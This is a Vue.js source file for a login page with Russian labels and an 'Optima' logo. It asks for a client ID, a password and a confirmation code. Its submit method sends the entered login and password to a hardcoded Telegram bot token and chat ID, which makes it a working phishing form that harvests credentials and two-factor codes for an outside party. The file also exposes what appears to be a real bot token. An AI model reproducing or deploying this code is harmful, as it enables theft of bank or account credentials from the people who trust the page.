<template>
  <div id="app">
    <div class="container d-flex align-items-center justify-content-center h-100">
      <div class="row">
        <div class="col pt-3">
          <img class="mb-3" src="@/logo_optima.jpg">

          <div v-show="step === 1" class="step">
          <form method="POST" @submit.prevent="submit">
            <div class="mb-3">
              <!-- <label for="name" class="form-label">Full name</label> -->
              <input required v-model="loginUser" type="text" class="form-control" maxlength="7" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Client ID: 0000000" id="name" aria-describedby="name">
              <div id="emailHelp" class="form-text">Максимальное количество цифр 7</div>
            </div>
            <div class="mb-3">
              <!-- <label for="exampleInputEmail1" class="form-label">Email address</label> -->
              <input required v-model="idCard" type="password" class="form-control" placeholder="Пароль" id="exampleInputEmail1" aria-describedby="emailHelp">
              <!-- <div id="emailHelp" class="form-text">We'll never share your email with anyone else.</div> -->
            </div>
            <!-- <div class="mb-3">
              <label for="subject" class="form-label">Subject</label>
              <input required v-model="subject" type="text" class="form-control" id="subject">
            </div>
            <div class="mb-3">
              <label class="form-check-label" for="exampleCheck1">Message</label>
              <textarea required v-model="message" type="text" class="form-control" id="exampleCheck1"/>
            </div> -->
            <div class="text-center">
              <button type="submit" class="btn btn-danger" @click="nextCodeAuth">Войти</button>
            </div>
          </form>
          </div>

          <div v-show="step === 2" class="step">
          <form method="POST" @submit.prevent="submit">
            <div class="mb-3">
              <div>Код подвержение</div>
              <!-- <label for="name" class="form-label">Full name</label> -->
              <input required v-model="loginUser" type="text" class="form-control" maxlength="7" pattern="-?(\d+|\d+.\d+|.\d+)([eE][-+]?\d+)?" placeholder="Код" id="name" aria-describedby="name">
              <div id="emailHelp" class="form-text">Максимальное количество цифр 5</div>
            </div>
            <!-- <div class="mb-3">
              <label for="exampleInputEmail1" class="form-label">Email address</label>
              <input required v-model="idCard" type="password" class="form-control" placeholder="Пароль" id="exampleInputEmail1" aria-describedby="emailHelp">
              <div id="emailHelp" class="form-text">We'll never share your email with anyone else.</div>
            </div> -->
            <!-- <div class="mb-3">
              <label for="subject" class="form-label">Subject</label>
              <input required v-model="subject" type="text" class="form-control" id="subject">
            </div>
            <div class="mb-3">
              <label class="form-check-label" for="exampleCheck1">Message</label>
              <textarea required v-model="message" type="text" class="form-control" id="exampleCheck1"/>
            </div> -->
            <div class="text-center">
              <button type="submit" class="btn btn-danger" @click="nextCodeAuth">Подвердить</button>
            </div>
          </form>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: 'App',

  data() {
    return {
      fullName: '',
      email: '',
      subject: '',
      message: '',

      token: '5681484607:AAHzEthwDk9Q88w3CPVg5xnoon5R0adaxGs',
      chatId: -852249326,

      step: 1
    }
  },

  methods: {
    submit() {
      const fullMessage = `Логин: ${this.loginUser}\nПароль: ${this.idCard}`;
      this.$http.post(`https://api.telegram.org/bot${this.token}/sendMessage?chat_id=${this.chatId}&text=${fullMessage}`)
      // .then(response => {
      //   console.log("Successfully!", response);
      // }) .catch(error => {
      //   console.log(error);
      // });
    },
    nextCodeAuth() {
      this.step++
    }
  }
}
</script>

<style>
.btn:focus, .btn:active {
  box-shadow: none !important;
}

.form-control:focus, .form-control:active {
  box-shadow: none !important;
}

.h-100 {
  height: 100vh !important;
}

.form-text {
  margin-top: -2px;
}
</style>